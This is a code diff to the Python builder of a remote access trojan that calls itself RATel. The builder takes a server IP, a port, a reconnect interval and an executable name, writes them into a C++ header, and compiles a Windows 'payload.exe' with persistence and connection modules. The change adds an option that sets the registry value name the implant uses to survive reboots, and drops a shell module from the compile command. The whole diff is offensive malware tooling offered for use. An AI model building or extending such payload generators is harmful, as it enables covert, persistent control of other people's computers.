@@ -16,7 +16,7 @@ class GeneratePayload:
 
     error = False
 
-    def __init__(self,ip,auto=False, port=4444, reco=20, name="payload.exe"):
+    def __init__(self,ip,auto, port, reco, name, registry):
 
         self.path =  os.getcwd()+"/"+"client/inc/common.h"
         self.list_const_str = ["IP_ADDRESS","NAME_PROG","PATH_ADMIN","PATH_NOT_ADMIN","NAME_KEY_REGISTER","SPLIT"]
@@ -31,6 +31,8 @@ class GeneratePayload:
         self.port = port
         self.ip = ip 
         self.name = name
+        self.registry = registry
+
         self.token = self.generateToken()
         
         try:
@@ -71,9 +73,9 @@ class GeneratePayload:
 
         if(self.os == "Linux"):
             #if os is linux <3
-            cmd = "i686-w64-mingw32-g++ main.cpp  other.cpp  ModShell.cpp  HandShake.cpp  Connexion.cpp  Persistence.cpp  -o {}  -lws2_32 -static-libgcc -static-libstdc++ -Os -s".format(current_path+"/payload/"+self.name)
+            cmd = "i686-w64-mingw32-g++ main.cpp  other.cpp   HandShake.cpp  Connexion.cpp  Persistence.cpp  -o {}  -lws2_32 -static-libgcc -static-libstdc++ -Os -s".format(current_path+"/payload/"+self.name)
         elif(self.os == "Windows"):
-            cmd = "g++ main.cpp HandShake.cpp ModShell.cpp Persistence.cpp Connexion.cpp other.cpp -o {} -lws2_32 -Os -s".format(self.name)
+            cmd = "g++ main.cpp HandShake.cpp  Persistence.cpp Connexion.cpp other.cpp -o {} -lws2_32 -Os -s".format(current_path+"/payload/"+self.name)
         else:
             other.printColor("error","[-] RATel is incompatible with: {}".format(self.os))
             other.printColor("error","[-] please try to restart the RATelgenerator on Windows or Linux.")
@@ -105,7 +107,7 @@ class GeneratePayload:
         other.printColor("information","[+] the current OS of the system: {}\n".format(self.os))
 
         #print(other.customHeader(self.ip, self.auto, self.port, self.reco, self.name, self.token))
-        self.writeFile(other.customHeader(self.ip, self.auto, self.port, self.reco, self.name, self.token))
+        self.writeFile(other.customHeader(self.ip, self.auto, self.port, self.reco, self.name, self.token, self.registry))
         self.compilate() #compilate
         time.sleep(2) #tempo 
         self.writeFile(str(other.commonHeader())) #rewrite default header
@@ -118,9 +120,9 @@ parser.add_argument("-a","--auto", action="store_true", default=False, help="if 
 parser.add_argument("-p","--port", dest="PORT", default=4444, help="the port number of the server.")
 parser.add_argument("-i","--ip", dest="IP", required=True, help="IP address of the server.")
 parser.add_argument("-r","--reconnect", dest="RECONNECT",default=20,  help="the time between each reconnection attempt if the server is offline (in seconds).")
-parser.add_argument("-n","--name",dest="NAME", default="payload.exe", help="the name of the executable (of the rat)")
-parser.add_argument("-d","--move",dest="MOVE" ,default=False)
-
+parser.add_argument("-n","--name", dest="NAME", default="payload.exe", help="the name of the executable (of the rat)")
+parser.add_argument("-m","--move", dest="MOVE", default=False, help="Under development...")
+parser.add_argument("-vr","--registry", dest="REGISTRY_VALUE", default="win64", help="the name of the value of the subkey of the windows registry.")
 init()
 
 try:
@@ -132,14 +134,15 @@ try:
     PORT = int(argv["PORT"])
     IP  = str(argv["IP"])
     RECO = int(argv["RECONNECT"])
-    name = str(argv["NAME"])
+    NAME = str(argv["NAME"])
+    REGISTRY = str(argv["REGISTRY_VALUE"])
 
     if not(argv["MOVE"]):
         PATH = False
     else:
         PATH = argv["MOVE"]
 
-    GeneratePayload(IP, AUTO, PORT, RECO, name)
+    GeneratePayload(IP, AUTO, PORT, RECO, NAME, REGISTRY)
 
 except SystemExit:
     
